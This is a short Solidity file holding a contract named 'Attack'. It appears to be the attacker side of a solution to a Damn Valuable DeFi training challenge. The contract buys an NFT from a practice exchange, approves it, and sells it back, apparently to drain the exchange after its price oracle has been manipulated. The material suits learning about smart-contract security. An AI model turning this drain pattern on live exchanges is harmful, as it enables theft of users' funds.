// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Exchange.sol";
import "../DamnValuableNFT.sol";


contract Attack {
    Exchange exchange;
    DamnValuableNFT token;
    uint256 id;

    constructor(Exchange _exchange, DamnValuableNFT _token){
        exchange = _exchange;
        token = _token;
    }

    function attack1()external{
        id = exchange.buyOne{value: address(this).balance}();
        token.approve(address(exchange), id);
    }

    function attack2()external{
        exchange.sellOne(id);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4){
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
    receive() external payable {}
}